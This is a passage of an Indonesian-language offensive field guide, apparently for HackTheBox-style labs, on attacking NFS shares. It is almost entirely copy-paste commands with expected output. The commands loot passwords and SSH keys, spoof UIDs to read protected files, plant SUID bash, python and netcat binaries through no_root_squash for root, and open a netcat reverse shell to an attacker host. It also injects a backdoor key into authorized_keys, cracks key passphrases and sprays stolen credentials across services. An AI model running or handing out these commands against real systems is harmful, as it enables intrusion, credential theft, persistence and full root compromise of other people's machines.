grep -r "password" $MOUNT_DIR 2>/dev/null | grep -v "Binary" | head -30
grep -r "passwd\|secret\|token\|api_key" $MOUNT_DIR 2>/dev/null | grep -v "Binary" | head -30
grep -r "BEGIN.*PRIVATE KEY\|BEGIN RSA" $MOUNT_DIR 2>/dev/null
```

**OUTPUT BERHASIL ✅ — SSH key ditemukan:**

text

```
/mnt/nfs_loot/.ssh/id_rsa
/mnt/nfs_loot/developer/.ssh/id_rsa
```

➡️ Ada SSH key! Cek apakah bisa dibaca langsung atau butuh UID Spoofing.

**OUTPUT BERHASIL ✅ — Config file dengan credentials:**

text

```
/mnt/nfs_loot/web/wp-config.php:define('DB_PASSWORD', 'M4st3rP@ss2024');
/mnt/nfs_loot/app/.env:DATABASE_URL=postgres://admin:secret123@localhost/db
```

➡️ SIMPAN CREDENTIALS:

Bash

```
echo "DB admin:M4st3rP@ss2024" >> ~/nfs_loot/creds/found_creds.txt
echo "DB admin:secret123" >> ~/nfs_loot/creds/found_creds.txt

# Test credentials ke service lain
nxc smb $TARGET -u "admin" -p "M4st3rP@ss2024"
nxc ssh $TARGET -u "admin" -p "M4st3rP@ss2024"
ssh admin@$TARGET    # → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a> jika berhasil
```

**OUTPUT BERHASIL ✅ — Backup archive ditemukan:**

text

```
/mnt/nfs_loot/backup/site_backup_2024.tar.gz
```

➡️ Ekstrak dan analisis:

Bash

```
cp $MOUNT_DIR/backup/site_backup_2024.tar.gz ~/nfs_loot/files/
cd ~/nfs_loot/files/
tar xzf site_backup_2024.tar.gz 2>/dev/null
find . -name "*.php" -o -name "*.conf" -o -name "*.env" 2>/dev/null \
    | xargs grep -iE "(password|passwd|secret|api_key)" 2>/dev/null
```

**OUTPUT GAGAL ❌ — Permission Denied pada semua file sensitif:**

text

```
cat: /mnt/nfs_loot/id_rsa: Permission denied
cat: /mnt/nfs_loot/db_config.php: Permission denied
```

➡️ File-file sensitif butuh UID yang spesifik. Catat UID pemiliknya dan lanjut ke **FASE 4 — UID Spoofing**.

---

## ═══════════════════════════════════════

## FASE 4: UID SPOOFING ATTACK

## ═══════════════════════════════════════

> **Tujuan:** Bypass permission "Permission Denied" dengan membuat user lokal yang UID-nya sama dengan pemilik file di server NFS.  
> **Konsep:** NFSv2/NFSv3 TIDAK verifikasi identity — mereka hanya percaya angka UID yang dikirimkan klien!

### Langkah 4.1 — Identifikasi UID Target dan Buat User Spoofed

Bash

```
# Step 1: Catat UID yang ingin di-spoof dari output ls -lan
# Contoh: id_rsa dimiliki oleh UID 1001
TARGET_UID=1001
TARGET_GID=1001

# Step 2: Cek apakah UID sudah ada di Parrot OS
getent passwd $TARGET_UID
id $TARGET_UID 2>/dev/null
```

**OUTPUT — UID belum ada:**

text

```
(no output / empty)
```

➡️ UID belum dipakai, bisa langsung buat:

Bash

```
# Buat user dummy dengan UID yang sama persis
sudo useradd -u $TARGET_UID -m fakeuser_$TARGET_UID

# Verify
id fakeuser_$TARGET_UID
# Output: uid=1001(fakeuser_1001) gid=1001(fakeuser_1001) groups=1001(fakeuser_1001)

# Pindah ke user tersebut
sudo su fakeuser_$TARGET_UID

# Verify UID aktif
id
# Output: uid=1001(fakeuser_1001) ...

# Baca file yang sebelumnya Permission Denied
cat $MOUNT_DIR/id_rsa
```

**OUTPUT — UID sudah ada (konflik):**

text

```
fakeuser:x:1001:1001::/home/fakeuser:/bin/bash
```

➡️ UID sudah dipakai akun lain. Buat dengan home di /tmp agar tidak konflik:

Bash

```
sudo useradd -u $TARGET_UID -m -d /tmp/fake_$TARGET_UID -s /bin/bash spoofed_$TARGET_UID
sudo su spoofed_$TARGET_UID
id
cat $MOUNT_DIR/id_rsa
```

---

### Langkah 4.2 — Eksekusi UID Spoofing

Bash

```
# Setelah pindah ke user spoofed (via sudo su fakeuser_1001):

# 1. Baca SSH private key
cat $MOUNT_DIR/id_rsa
# Atau copy ke /tmp
cat $MOUNT_DIR/id_rsa > /tmp/stolen_key_$TARGET_UID
exit    # Kembali ke user normal

# 2. Set permission dan gunakan
chmod 600 /tmp/stolen_key_$TARGET_UID
ssh -i /tmp/stolen_key_$TARGET_UID user@$TARGET

# 3. Jika butuh passphrase, crack dulu
ssh2john /tmp/stolen_key_$TARGET_UID > /tmp/ssh_hash.txt
john /tmp/ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**OUTPUT BERHASIL ✅ — Key berhasil dibaca:**

text

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0z3...
-----END RSA PRIVATE KEY-----
```

➡️ SIMPAN dan gunakan:

Bash

```
# Simpan key
cat $MOUNT_DIR/id_rsa > ~/nfs_loot/keys/stolen_id_rsa
exit
chmod 600 ~/nfs_loot/keys/stolen_id_rsa

# Test SSH — coba berbagai username (dari notes.txt atau file lain yang sudah dibaca)
ssh -i ~/nfs_loot/keys/stolen_id_rsa developer@$TARGET
ssh -i ~/nfs_loot/keys/stolen_id_rsa user@$TARGET
ssh -i ~/nfs_loot/keys/stolen_id_rsa peter@$TARGET
# → Lanjut ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
```

**OUTPUT GAGAL ❌ — Masih Permission Denied setelah UID Spoofing:**

text

```
cat: /mnt/nfs_loot/id_rsa: Permission denied
```

➡️ GID juga di-enforce! Cek GID file:

Bash

```
ls -lan $MOUNT_DIR/id_rsa
# Misal: -rw-r----- 1 1001 1002 (UID 1001, GID 1002)
# Kita perlu UID 1001 DAN GID 1002

# Buat group dan user dengan GID yang tepat
sudo groupadd -g 1002 targetgroup_1002
sudo useradd -u 1001 -g targetgroup_1002 -m spoofed_user
sudo su spoofed_user
id
# Output: uid=1001 gid=1002(targetgroup_1002)
cat $MOUNT_DIR/id_rsa
```

**OUTPUT GAGAL ❌ — Mount dengan NFSv4 menolak UID spoofing:**

text

```
# UID Spoofing tidak bekerja di NFSv4 dengan Kerberos
# Output tetap menunjukkan nobody atau access denied
```

➡️ Target mungkin pakai NFSv4 dengan Kerberos. Coba fokus ke file yang world-readable atau cari path lain:

Bash

```
# Cek versi NFS yang digunakan
mount | grep nfs
# Jika tertulis "nfs4" → NFSv4 dengan Kerberos mungkin aktif

# Fokus ke file yang world-readable
find $MOUNT_DIR -perm -o+r -type f 2>/dev/null | head -30
```

**OUTPUT ALTERNATIF — Bypass UID Tanpa sudo (menggunakan unshare):**

Bash

```
# Jika tidak punya sudo di mesin kamu
# User Namespaces untuk spoof UID tanpa root

unshare -U bash --map-user=$TARGET_UID

# Verify
id
# Output: uid=1001(...)

# Baca file
cat $MOUNT_DIR/id_rsa
exit
```

---

## ═══════════════════════════════════════

## FASE 5: CEK no_root_squash (PRIVILEGE ESCALATION!)

## ═══════════════════════════════════════

> **Masuk sini jika:** Share yang di-mount memiliki izin WRITE (rw) dan kamu ingin cek apakah bisa escalate ke root.  
> **Konsep:** `no_root_squash` = server percaya user root dari klien. Kita bisa taruh binary SUID root di share!

### Langkah 5.1 — Verifikasi no_root_squash

Bash

```
# TEST SEDERHANA: Buat file sebagai root lokal, lihat UID di server
sudo touch $MOUNT_DIR/test_root_check

# Cek UID pemilik file
ls -lan $MOUNT_DIR/test_root_check
```

**OUTPUT BERHASIL ✅ — no_root_squash AKTIF (UID = 0):**

text

```
-rw-r--r-- 1 0 0 0 Sep 3 12:00 test_root_check
```

➡️ `UID = 0` berarti server menerima klaim root dari klien! **JACKPOT!** Lanjut ke Langkah 5.2.

**OUTPUT GAGAL ❌ — root_squash AKTIF (UID = 65534 = nobody):**

text

```
-rw-r--r-- 1 65534 65534 0 Sep 3 12:00 test_root_check
```

➡️ root_squash aktif. File SUID tidak akan bekerja. Bersihkan dan cari jalur lain:

Bash

```
# Bersihkan
sudo rm -f $MOUNT_DIR/test_root_check

# Alternatif: Cek dari /etc/exports jika punya shell di target
# cat /etc/exports
# Cari: no_root_squash → jika ada di share lain, mount share tersebut
# Jika tidak ada → lanjut ke privesc lokal (sudo, SUID, cron) di <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

➡️ Bersihkan file test setelah cek:

Bash

```
sudo rm -f $MOUNT_DIR/test_root_check
```

---

### Langkah 5.2 — Eksploitasi no_root_squash (Root Shell Instan!)

> Prasyarat: Langkah 5.1 menunjukkan UID = 0 (no_root_squash AKTIF)

Bash

```
# METHOD 1: SUID Bash (PALING UMUM DAN STABIL)
# Di Parrot OS (sebagai root lokal):
sudo cp /bin/bash $MOUNT_DIR/rootbash
sudo chmod +xs $MOUNT_DIR/rootbash

# Verifikasi SUID bit aktif
ls -la $MOUNT_DIR/rootbash
# Output HARUS ada 's': -rwsr-xr-x 1 root root 1234567 rootbash
```

**OUTPUT BERHASIL ✅ — SUID bit terpasang:**

text

```
-rwsr-xr-x 1 root root 1234215 Sep  3 12:05 /mnt/nfs_loot/rootbash
```

➡️ **Sekarang execute di sisi target** (harus punya shell di target dulu):

Bash

```
# Di shell target (reverse shell / SSH / web shell):
# Navigasi ke folder share di server
ls -la /var/nfs/general/rootbash    # Konfirmasi file ada dengan SUID
/var/nfs/general/rootbash -p         # FLAG -p WAJIB!

# Verify root
whoami
# Output: root

id
# Output: uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer)

# Ambil flag!
cat /root/root.txt
```

**OUTPUT BERHASIL ✅ — Root shell:**

text

```
# whoami
root
# id
uid=1000(developer) gid=1000(developer) euid=0(root)
```

➡️ **ROOT SHELL!** Lanjut ke **FASE 7 — Post-Exploitation**.

**OUTPUT GAGAL ❌ — SUID bash tidak naik privilege (tetap user biasa):**

text

```
developer@target:/var/nfs/general$ ./rootbash -p
developer@target:/var/nfs/general$ whoami
developer    ← Tidak berubah!
```

➡️ Tiga kemungkinan penyebab:

Bash

```
# Kemungkinan 1: Lupa flag -p
./rootbash -p    # Pastikan ada -p!

# Kemungkinan 2: root_squash aktif tapi lolos verifikasi test
# Cek lagi dari dalam target:
cat /etc/exports | grep no_root_squash

# Kemungkinan 3: Filesystem di-mount dengan nosuid
# Cek di sisi target:
mount | grep nfs | grep nosuid

# Jika ada nosuid → SUID tidak akan bekerja di filesystem NFS ini
# Solusi: Coba METHOD 2 (Python) atau METHOD 3 (reverse shell)
```

**METHOD 2 — Python3 SUID (Alternatif):**

Bash

```
# Di Parrot OS (root):
sudo cp /usr/bin/python3 $MOUNT_DIR/rootpy
sudo chmod +xs $MOUNT_DIR/rootpy

# Di target:
/var/nfs/general/rootpy -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
# Output: root
```

**METHOD 3 — SUID Netcat Reverse Shell:**

Bash

```
# Di Parrot OS (root):
sudo cp /usr/bin/nc.traditional $MOUNT_DIR/rootnc 2>/dev/null || \
sudo cp /bin/nc $MOUNT_DIR/rootnc
sudo chmod +xs $MOUNT_DIR/rootnc

# Di Parrot OS, buka listener
nc -lvnp $LPORT

# Di target:
/var/nfs/general/rootnc -e /bin/bash $LHOST $LPORT
# Koneksi masuk sebagai root!
```

---

## ═══════════════════════════════════════

## FASE 6: SSH ATTACKS VIA NFS

## ═══════════════════════════════════════

> **Masuk sini jika:** NFS share adalah folder `/home/<user>` yang di-export dengan rw access.

### Langkah 6.1 — Curi SSH Private Key dari Home Directory

Bash

```
# Mount folder home user
sudo mount -t nfs -o nolock $TARGET:/home/developer $MOUNT_DIR

# Cari .ssh directory
ls -lan $MOUNT_DIR/.ssh/ 2>/dev/null
ls -lan $MOUNT_DIR/
find $MOUNT_DIR -name "id_rsa*" 2>/dev/null

# Cek UID pemilik key
ls -lan $MOUNT_DIR/.ssh/id_rsa
```

**OUTPUT BERHASIL ✅ — id_rsa ditemukan dan bisa dibaca:**

text

```
-rw------- 1 1000 1000 2602 Sep 3 10:10 /mnt/nfs_loot/.ssh/id_rsa
```

Jika UID kamu di Parrot sama dengan 1000 → bisa langsung baca. Jika tidak → UID Spoofing (FASE 4).

Bash

```
# Salin key
cp $MOUNT_DIR/.ssh/id_rsa ~/nfs_loot/keys/developer_id_rsa
chmod 600 ~/nfs_loot/keys/developer_id_rsa

# Test login SSH
ssh -i ~/nfs_loot/keys/developer_id_rsa developer@$TARGET

# Jika ada passphrase, crack dulu
ssh2john ~/nfs_loot/keys/developer_id_rsa > /tmp/key_hash.txt
john /tmp/key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22931 /tmp/key_hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Langkah 6.2 — Injeksi SSH Public Key (Jika rw Access)

> Jika share memiliki write access, kita bisa TAMBAHKAN public key kita ke authorized_keys target!

Bash

```
# Step 1: Generate SSH keypair baru
ssh-keygen -t rsa -b 4096 -f ~/nfs_loot/keys/nfs_backdoor -N ""
# -N "" = tanpa passphrase

# Step 2: Buat folder .ssh jika belum ada
sudo mkdir -p $MOUNT_DIR/.ssh
sudo chmod 700 $MOUNT_DIR/.ssh

# Step 3: Tambahkan public key ke authorized_keys
cat ~/nfs_loot/keys/nfs_backdoor.pub | sudo tee -a $MOUNT_DIR/.ssh/authorized_keys
sudo chmod 600 $MOUNT_DIR/.ssh/authorized_keys

# Verifikasi
cat $MOUNT_DIR/.ssh/authorized_keys

# Step 4: Login SSH
ssh -i ~/nfs_loot/keys/nfs_backdoor developer@$TARGET
```

**OUTPUT BERHASIL ✅ — SSH berhasil tanpa password:**

text

```
developer@target:~$ whoami
developer
developer@target:~$ cat ~/user.txt
[FLAG DITEMUKAN!]
```

➡️ Lanjut ke **[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)** untuk full SSH exploitation.

**OUTPUT GAGAL ❌ — Permission denied (publickey):**

text

```
developer@10.10.11.200: Permission denied (publickey).
```

➡️ Authorized_keys tidak ter-inject dengan benar. Cek:

Bash

```
# Cek apakah file authorized_keys sudah berisi key kita
cat $MOUNT_DIR/.ssh/authorized_keys

# Cek permission folder .ssh (harus 700)
ls -lan $MOUNT_DIR/ | grep .ssh

# Jika share hanya ro (read-only), tidak bisa inject
# Cek dengan: mount | grep nfs | grep ro
```

---

## ═══════════════════════════════════════

## FASE 7: LOW-PRIV SHELL → NFS PRIVESC

## ═══════════════════════════════════════

> **Masuk sini jika:** Sudah punya shell di target (via web exploit, SSH, dll) dan stuck, cari jalur escalation via NFS.

### Langkah 7.1 — Audit /etc/exports dari Shell Target

Bash

```
# Di shell target (www-data, user biasa, dll):
cat /etc/exports
```

**OUTPUT BERHASIL ✅ — no_root_squash ditemukan:**

text

```
/opt/dev_share *(rw,no_root_squash,async)
/var/backups   192.168.1.0/24(rw,sync,no_subtree_check)
```

➡️ `no_root_squash` + `rw` = **INSTANT ROOT PATH!**

Bash

```
# Catat share path
export VULN_SHARE="/opt/dev_share"

# Di Parrot OS (terminal terpisah):
sudo mount -t nfs -o nolock $TARGET:$VULN_SHARE /mnt/privesc
sudo cp /bin/bash /mnt/privesc/rootbash
sudo chmod +xs /mnt/privesc/rootbash
ls -la /mnt/privesc/rootbash    # Konfirmasi -rwsr-xr-x

# Kembali ke shell target:
/opt/dev_share/rootbash -p
whoami    # → root
cat /root/root.txt
```

**OUTPUT BERHASIL ✅ — Root shell via no_root_squash:**

text

```
# whoami
root
# cat /root/root.txt
HTB{nfs_no_root_squash_privesc}
```

**OUTPUT GAGAL ❌ — /etc/exports tidak bisa dibaca:**

text

```
cat: /etc/exports: Permission denied
```

➡️ Butuh privilege lebih atau cari cara lain:

Bash

```
# Coba showmount dari Parrot OS untuk lihat export yang mungkin ada
showmount -e $TARGET

# Cek apakah ada service NFS berjalan
systemctl status nfs-server 2>/dev/null
ps aux | grep nfs
netstat -tunp | grep 2049
```

---

## ═══════════════════════════════════════

## FASE 8: POST-EXPLOITATION & LOOT

## ═══════════════════════════════════════

### Langkah 8.1 — Comprehensive File Looting

Bash

```
# Setelah berhasil akses penuh ke share, download semua file sensitif
cd $MOUNT_DIR

# Cari semua file konfigurasi
find . \( -name "*.conf" -o -name "*.config" -o -name "*.yml" \
    -o -name "*.yaml" -o -name "*.env" -o -name "*.json" \
    -o -name "*.php" -o -name "*.py" -o -name "*.rb" \) 2>/dev/null \
    | xargs grep -iE "(password|passwd|secret|token|api_key|key)" 2>/dev/null \
    | tee ~/nfs_loot/creds/all_credentials.txt

# Cari semua SSH keys
find . -name "id_rsa*" -o -name "id_ecdsa*" -o -name "id_ed25519*" \
    -o -name "*.pem" -o -name "*.key" 2>/dev/null \
    | while read f; do
        cp "$f" ~/nfs_loot/keys/ 2>/dev/null
        chmod 600 ~/nfs_loot/keys/$(basename $f) 2>/dev/null
      done

# Cari bash history (goldmine untuk credentials)
find . -name ".bash_history" -o -name ".zsh_history" 2>/dev/null \
    | xargs cat 2>/dev/null | grep -iE "(password|pass|mysql|ssh|curl)" | head -30
```

---

### Langkah 8.2 — Cross-Service dari NFS

Bash

```
# Test semua credentials yang ditemukan ke service lain
cat ~/nfs_loot/creds/all_credentials.txt

# Test via SSH
ssh developer@$TARGET
nxc ssh $TARGET -u developer -p "password_found"

# Test via web (port 80/443)
curl -s -u "admin:password_found" http://$TARGET/

# Test via database
nxc mysql $TARGET -u root -p "password_found"
nxc mssql $TARGET -u sa -p "password_found"
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`clnt_create: RPC: Port mapper failure`|Port 111 diblokir|`nmap -p 111,2049 --script nfs-showmount $TARGET`|
|`bad option; needs helper program`|nfs-common belum install|`sudo apt install nfs-common -y`|
|`access denied by server`|IP di luar whitelist subnet|Pivot dari host di subnet yang diizinkan|
|`Connection refused`|NFS daemon tidak aktif|`rpcinfo -p $TARGET|
|Mount kosong / direktori kosong|Mounting berhasil tapi folder memang kosong|`df -h|
|`ls` tampilkan `?????????`|Stale file handle|Unmount lazy + remount `nfsvers=3,nolock`|
|Permission Denied setelah UID Spoof|GID juga di-enforce|Tambahkan group: `groupadd -g GID; useradd -u UID -g GID`|
|SUID bash tidak naik privilege|Lupa `-p` atau `nosuid` di mount|Cek `mount|
|SUID tidak bekerja di NFSv4|`nosuid` option aktif atau Kerberos|Pakai Python3 atau Netcat sebagai binary SUID alternatif|
|Terminal freeze/macet saat `ls`|RPC timeout / koneksi putus|Terminal baru: `sudo umount -l -f /mnt/nfs_loot`|
|NFSv4 mount fail|Server tidak support NFSv4 namespace|Force: `sudo mount -o vers=3,nolock ...`|
|`useradd: UID already in use`|UID sudah dipakai|`sudo useradd -u UID -m -d /tmp/fake_UID -s /bin/bash fakeuser`|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Port 111/2049 Open
│
├─ FASE 0: Port Detection
│   └─ nmap -sS -sU -p 111,2049 → rpcinfo -p
│
├─ FASE 1: Export List
│   ├─ showmount -e → [Share dengan *] → Mount siapa saja
│   ├─ [Share dengan subnet] → Cek apakah IP kamu dalam range
│   └─ [Tidak ada export] → Cek /etc/exports dari shell
│
├─ FASE 2: Mount Share
│   └─ sudo mount -t nfs -o nolock $TARGET:$SHARE $MOUNT_DIR
│
├─ FASE 3: Analisis Isi (ls -lan WAJIB!)
│   ├─ [World-readable] → cat langsung
│   ├─ [Permission Denied / UID X] → FASE 4 UID Spoofing
│   ├─ [SSH key ditemukan] → FASE 6 SSH attacks
│   └─ [Credentials ditemukan] → Test ke semua service
│
├─ FASE 4: UID Spoofing
│   ├─ sudo useradd -u UID fakeuser → sudo su fakeuser
│   └─ cat restricted_file → Credentials / SSH key
│
├─ FASE 5: no_root_squash Check
│   ├─ sudo touch /mnt → ls -lan (UID = 0?) → EXPLOIT!
│   ├─ [UID = 0] → cp /bin/bash + chmod +xs → rootbash -p → ROOT
│   └─ [UID = 65534] → root_squash aktif → jalur lain
│
├─ FASE 6: SSH via NFS
│   ├─ [Home dir exported] → Curi id_rsa → SSH login
│   └─ [rw access] → Inject authorized_keys → SSH login
│
└─ FASE 7: Low-Priv Shell → NFS PrivEsc
    ├─ cat /etc/exports → no_root_squash?
    └─ [YES] → Mount dari Parrot → SUID bash → ROOT
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
export MOUNT_DIR="/mnt/nfs_loot"; export REMOTE_SHARE="/var/nfs/general"
sudo mkdir -p $MOUNT_DIR; mkdir -p ~/nfs_loot/{files,creds,keys}
sudo apt install nfs-common -y 2>/dev/null

# === DISCOVERY ===
sudo nmap -sS -sU -p 111,2049 -sV -Pn $TARGET     # Port scan TCP+UDP
rpcinfo -p $TARGET                                   # List semua RPC services
showmount -e $TARGET                                 # Export list
nmap -p 111,2049 --script nfs-showmount,nfs-ls $TARGET  # Via Nmap

# === MOUNTING ===
sudo mount -t nfs -o nolock $TARGET:$REMOTE_SHARE $MOUNT_DIR          # Standard
sudo mount -t nfs -o nfsvers=3,nolock $TARGET:$REMOTE_SHARE $MOUNT_DIR # Force v3
sudo mount -t nfs -o ro,nolock $TARGET:$REMOTE_SHARE $MOUNT_DIR        # Read-only
df -h | grep nfs                                     # Verify mount

# === FILE ANALYSIS ===
ls -lan $MOUNT_DIR                                   # Numeric UID! WAJIB
find $MOUNT_DIR -name "id_rsa*" -o -name ".ssh" 2>/dev/null
find $MOUNT_DIR -name "*.conf" -o -name "*.php" -o -name ".env" 2>/dev/null
grep -r "password\|passwd\|secret" $MOUNT_DIR 2>/dev/null | head -20

# === UID SPOOFING ===
ls -lan $MOUNT_DIR                                   # Catat TARGET_UID
sudo useradd -u <TARGET_UID> -m fakeuser             # Buat user dummy
sudo su fakeuser                                     # Pindah ke user dummy
cat $MOUNT_DIR/restricted_file                       # Baca file!
exit

# === no_root_squash CHECK & EXPLOIT ===
sudo touch $MOUNT_DIR/test && ls -lan $MOUNT_DIR/test && sudo rm $MOUNT_DIR/test
# UID=0 → no_root_squash AKTIF!
sudo cp /bin/bash $MOUNT_DIR/rootbash && sudo chmod +xs $MOUNT_DIR/rootbash
# Di target: /path/to/share/rootbash -p → whoami → root

# === SSH KEY INJECTION ===
ssh-keygen -t rsa -b 4096 -f ~/nfs_loot/keys/nfs_backdoor -N ""
sudo mkdir -p $MOUNT_DIR/.ssh && sudo chmod 700 $MOUNT_DIR/.ssh
cat ~/nfs_loot/keys/nfs_backdoor.pub | sudo tee -a $MOUNT_DIR/.ssh/authorized_keys
sudo chmod 600 $MOUNT_DIR/.ssh/authorized_keys
ssh -i ~/nfs_loot/keys/nfs_backdoor user@$TARGET

# === CLEANUP ===
cd ~ && sudo umount $MOUNT_DIR                       # Unmount standar
sudo umount -l $MOUNT_DIR                            # Lazy unmount jika macet
sudo userdel fakeuser 2>/dev/null                    # Hapus user dummy
```

### Cross-Service dari NFS:

text

```
NFS Findings
     │
     ├─ ─→ SSH key ditemukan     → ssh -i key user@target → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ DB credentials        → MySQL/MSSQL/PostgreSQL → 14_database_workflow.md
     ├──→ Web credentials       → HTTP/HTTPS → <a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>
     ├──→ Backup archives       → Unpack → grep credentials → test ke semua service
     ├──→ no_root_squash        → SUID bash → ROOT → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
     └──→ /home exported (rw)   → Inject authorized_keys → SSH tanpa password
```

---

> **➡️ NEXT:** Setelah NFS selesai, lanjut ke **`[14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide](/docs/mysql)`** untuk eksploitasi database MySQL/MariaDB — root login tanpa password, `LOAD_FILE()` untuk baca file sistem, `INTO OUTFILE` untuk webshell injection, dan UDF untuk RCE penuh.
